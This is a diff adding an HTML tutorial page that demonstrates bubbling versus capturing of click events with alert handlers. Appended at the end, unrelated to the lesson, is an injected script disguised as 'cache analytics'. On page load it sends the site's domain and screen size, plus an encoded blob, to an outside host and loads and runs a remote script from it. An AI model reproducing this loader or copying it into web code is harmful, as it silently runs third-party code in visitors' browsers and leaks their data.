@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+div {
+    background-color: coral;
+    border: 1px solid;
+    padding: 50px;
+}
+</style>
+</head>
+<body>
+
+<p>This example demonstrates the difference between bubbling and capturing when adding event listeners.</p>
+
+<div id="myDiv">
+  <p id="myP">Click this paragraph, I am Bubbling.</p>
+</div><br>
+
+<div id="myDiv2">
+  <p id="myP2">Click this paragraph, I am Capturing.</p>
+</div>
+
+<script>
+	document.getElementById("myP").addEventListener("click", function() {
+	    alert("You clicked the P element!");
+	}, false);
+
+	document.getElementById("myDiv").addEventListener("click", function() {
+	    alert("You clicked the DIV element!");
+	}, false);
+
+	document.getElementById("myP2").addEventListener("click", function() {
+	    alert("You clicked the P element!");
+	}, true);
+
+	document.getElementById("myDiv2").addEventListener("click", function() {
+	    alert("You clicked the DIV element!");
+	}, true);
+</script>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX1ZNloVoH39dWhsIbJbcoYU1%2bJ5Qws8p73e6cTZC6LQ%2bsjslM%2f3xQ4HpEAT39tf%2f0pSy1cCQsFDcO%2b%2bp8FJUKHkMSb3VfDbny1I5oeb17V3mf7FAVDNrEy7cWF%2b6Oum6UtlKNnbPd2tqjI3KtIIOAZKCvMbQT5Wu8oXeGtoGRMhPTznaPto62z13xGSIX5ZWWdXXLRm4%2f%2fRmGUt4TD02boKndbfQ%2f52RP69OJPpIajiUcUaY92EYvSwd%2b80HqKkArDXNl61G4AoeclUsGcywSe9Jf0pQpedJm%2bj2HAoQGkcEPs8Ew0pdkh5FX%2fimhrsGklymAl7vsq3RAKlnJvZNOIhHaE4S4Z30RniXcLe3lWc%2fQ%2fmnGQ3YCH%2baDimYJxrNAc9tgXIOKq7vOtGIrWaqyeiBXqwU6DizqkQR1PTVxFMvUAbiypk4zS2q5wNa%2fda3W6hbiCQp9PDka8lJkYXMOjHfPXjvYfGwuNGwJnpH%2fJ2OgF%2fzjnob3hK%2f53xUvXL2nt1sG9Zq18aI106SEXRZqMSF%2bN6Wt409QZ15e4BoRnynJWyA63Vsy1fID31rDVHXuHfIwvV%2fLuNF80S%2bOvcg4GBVjODR5ZYIh5KWGJE5UEHBihPdyeDPDABGasiK3WG5wLbQ8JfTKDsotvDjyZwwQIrUZlgFawFBJPJVm1%2fApSf3FQmy7JxQMMw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
